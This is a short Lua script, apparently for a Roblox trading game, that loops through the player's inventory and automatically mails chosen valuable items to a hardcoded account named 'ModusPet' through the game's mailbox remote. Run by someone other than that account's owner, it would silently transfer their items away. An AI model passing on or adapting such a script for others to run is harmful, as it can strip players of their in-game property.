-- Configuration
local Config = {
    autoMailEnabled = true,
    delayBetweenMails = 10, -- Delay between mail batches in seconds
    delayBetweenItems = 1,  -- Delay between individual items
    defaultMinimum = 1,     -- Default minimum if not specified for an item
    recipient = "ModusPet"
}

-- Flattened item definitions with class indicating category
local ItemsToMail = {
    ["Crystal Key"] = { minimum = 5, class = "Misc" },
    ["Crystal Key Lower Half"] = { minimum = 5, class = "Misc" },
    ["Secret Key"] = { minimum = 1, class = "Misc" },
    ["Golden Fishing Rod"] = { minimum = 1, class = "Misc" },
    ["Diamond Fishing Rod"] = { minimum = 1, class = "Misc" },
    ["God Potion"] = { minimum = 1, class = "Consumable" },
    ["Jelly God Potion"] = { minimum = 1, class = "Consumable" },
    ["Instant Luck Potion"] = { minimum = 1, class = "Consumable", checkTier = 4 },
    ["Fishing Bait"] = { minimum = 5, class = "Consumable", checkTier = 5 },
    ["Exclusive Treasure Chest"] = { minimum = 3,  class = "Lootbox" }
}

-- Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Network = ReplicatedStorage.Network
local MailboxSend = Network:FindFirstChild("Mailbox: Send")

-- Modules
local SaveModule = require(ReplicatedStorage.Library.Client.Save)

-- Helper function to send mail
local function sendMail(itemName, category, index, amount, displayName)
    MailboxSend:InvokeServer(
        Config.recipient,
        displayName or itemName,
        category,
        index,
        amount
    )
end

-- Function to check if an item meets mailing criteria
local function shouldMailItem(item, itemConfig)
    local minimumRequired = itemConfig.minimum or Config.defaultMinimum
    local currentAmount = item._am or 1
    
    if itemConfig.checkTier and item.tn ~= itemConfig.checkTier then
        return false
    end
    
    return currentAmount >= minimumRequired
end

-- Main mailing function
local function processInventory(inventory)
    for category, items in pairs(inventory) do
        for index, item in pairs(items) do
            local itemConfig = ItemsToMail[item.id]
            if itemConfig and itemConfig.class == category then
                if shouldMailItem(item, itemConfig) then
                    local displayName = itemConfig.displayName or item.id
                    sendMail(item.id, category, index, item._am or 1, displayName)
                end
                task.wait(Config.delayBetweenItems)
            end
        end
    end
end

-- Main loop
local function autoSendMail()
    while true do
        if Config.autoMailEnabled then
            local saveData = SaveModule.Get()
            processInventory(saveData.Inventory)
        end
        task.wait(Config.delayBetweenMails)
    end
end

-- Initialize
autoSendMail()
